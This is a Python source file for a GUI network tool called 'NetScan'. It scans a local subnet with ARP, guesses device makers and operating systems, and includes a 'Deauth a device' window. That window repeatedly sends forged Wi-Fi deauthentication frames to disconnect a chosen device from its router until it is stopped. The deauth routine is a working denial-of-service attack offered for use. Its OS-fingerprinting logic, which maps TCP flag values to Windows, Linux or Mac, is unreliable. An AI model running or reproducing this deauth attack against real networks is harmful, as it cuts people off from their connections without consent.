# Imports
import PySimpleGUI as sg
from scapy.all import *
import scapy.all as scapy
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from manuf import manuf
import datetime
import socket
import threading

# Varibles
hostname = conf.route.route("0.0.0.0")[2]
show_short_oui = True
now = datetime.datetime.now()
stop_deauth_event = threading.Event()
deauth_thread = None

# Network stuff
def deauth_function(target_mac, bssid, count=1):
    global stop_deauth_event

    stop_deauth_event.clear()  # Clears the event flag

    while not stop_deauth_event.is_set():
        deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
        for _ in range(count):
            scapy.send(deauth_packet, verbose=False)
        
        time.sleep(10)
        print("Deauthed for 10 Seconds, repeating...")

def start_deauth(target_mac, bssid, count=1):
    global deauth_thread

    # Checks if there is an existing deauth thread, and if yes, stops it before starting a new one
    if deauth_thread and deauth_thread.is_alive():
        stop_deauth_thread()

    deauth_thread = threading.Thread(target=deauth_function, args=(target_mac, bssid, count))
    deauth_thread.start()

def stop_deauth_thread():
    global stop_deauth_event
    stop_deauth_event.set()
    print("Stopped Deauth.")

def get_device_type(mac_address):
    global show_short_oui
    p = manuf.MacParser()
    if show_short_oui:
        manufacturer = p.get_manuf(mac_address)
    else:
        manufacturer = p.get_manuf_long(mac_address)
    return manufacturer or "Unknown"

def get_hostname(ip):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except socket.herror as e:
        return "Unknown"

def scan(ip):
    print("Sending ARP requests...")
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if show_short_oui:
        print("\nIP\t\tMAC Address\t\tManufacturer\t\tOS\t\tHostname\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------")
    else:
        print("\nIP\t\tMAC Address\t\tManufacturer\t\t\t\tOS\t\tHostname\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------")
    
    for answered_packet in answered_list:
        ip = answered_packet[1].psrc
        mac = answered_packet[1].hwsrc
        device_type = get_device_type(mac)
        os_info = "Unknown"

        try:
            syn_packet = scapy.IP(dst=ip) / scapy.TCP(dport=80, flags="S")
            response = scapy.sr1(syn_packet, timeout=1, verbose=False)

            if response:
                if response.haslayer(scapy.TCP) and response.getlayer(scapy.TCP).flags == 0x12:
                    os_info = "Linux/Unix"
                elif response.haslayer(scapy.TCP) and response.getlayer(scapy.TCP).flags == 0x14:
                    os_info = "Windows"
                elif response.haslayer(scapy.TCP) and response.getlayer(scapy.TCP).flags == 0x18:
                    os_info = "Mac OS"
                elif "Android" in response.summary():
                    os_info = "Android"
                elif "iOS" in response.summary():
                    os_info = "iOS"
        except:
            os_info = "Error"

        host_name = get_hostname(ip)

        if show_short_oui:
            print(f"{ip}\t\t{mac}\t\t{device_type}\t\t{os_info}\t\t{host_name}")
        else:
            print(f"{ip}\t\t{mac}\t\t{device_type}\t\t\t\t{os_info}\t\t{host_name}")

    print("\nDone\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------")
    print("Finished at " + str(now))

def scan_thread(ip):
    scanning_thread = threading.Thread(target=scan, args=(ip,))
    scanning_thread.start()

# GUI
sg.theme('Topanga') 

def help():
    layout2 = [
        [sg.Text('FAQ:')],
        [sg.Text('    1. No results? I could be wrong but I believe this is occurs when WinPcap is used. This is not an issue with NetScan, but rather WinPcap.')],
        [sg.Text('       This can also occur because the IP Range you entered was Invalid. 24 is set by default which should work just fine.')],
        [sg.Text('')],
        [sg.Text("    2. OUI Manufacturer information is only 8 characters long. This issue has been resolved as of 0.0.4, however I thought this would also")],
        [sg.Text("       make a good feature. So there is now a checkbox located at the top to show Short OUIs, or long OUIs. If you want the full version,")],
        [sg.Text("       make sure you've unchecked the box.")],
        [sg.Text('')],
        [sg.Text('Please report any bugs or issues you may find to williamchiozza@protonmail.com, and view the Documentation for more information.')]
    ]

    help_window = sg.Window('NetScan Help', layout2, resizable=True)

    while True:
        event, values = help_window.Read()
        if event in (None, "Exit"):
            break
    help_window.Close()

def deauth_window():
    layout3 = [
        [sg.Text("Target MAC:                    Router MAC:")],
        [sg.Input(key="-TARGET-", size=(20, 1)), sg.Input(key="-ROUTER-", size=(20, 1))],
        [sg.Output(size=(39, 25), key="-OUT-")],
        [sg.Button("Deauth", key="-DEAUTH-"), sg.Button("Stop Deauth", key="-STOP-")]
    ]

    deauth_win = sg.Window("Deauth Window", layout3)

    while True:
        event, values = deauth_win.Read()

        if event in (None, "Exit"):
            break
        elif event in '-DEAUTH-':
            start_deauth(target_mac=values["-TARGET-"], bssid=values["-ROUTER-"])
            print("Deauthing " + values["-TARGET-"] + ", this lasts about 10 seconds so it will be looped every 10 seconds.\n--------------------------------------------------------------------")
        elif event in "-STOP-":
            stop_deauth_thread()

    deauth_win.Close()

def main():
    global show_short_oui
    layout = [  
        [sg.Text('Router IP'), sg.Text("                     IP Range"), sg.Checkbox("Short OUIs", key='OUI', default=False)],
        [sg.Input(hostname, key='_IN_', size=(20,1)), sg.Input("24", key="-IN-", size=(10,1))],
        [sg.Output(size=(95,25), key="-OUT-")],
        [sg.Button('Scan Network'), sg.Button('Deauth a device'), sg.Button('Help'), sg.Button("Clear output", key="-CLEAR-"), sg.Button('Exit')]
    ]

    window = sg.Window('NetScan', layout)

    while True:
        event, values = window.Read()
        if event in (None, "Exit"):
            break
        elif event in 'Help':
            help()
        elif event in "-CLEAR-":
            window.FindElement("-OUT-").Update('')
        elif event in 'Deauth a device':
            deauth_window()
        elif event == 'Scan Network':
            show_short_oui = values['OUI']
            scan_thread(ip=(values['_IN_'] + "/" + values['-IN-']))

    window.Close()

# Program go brr
main()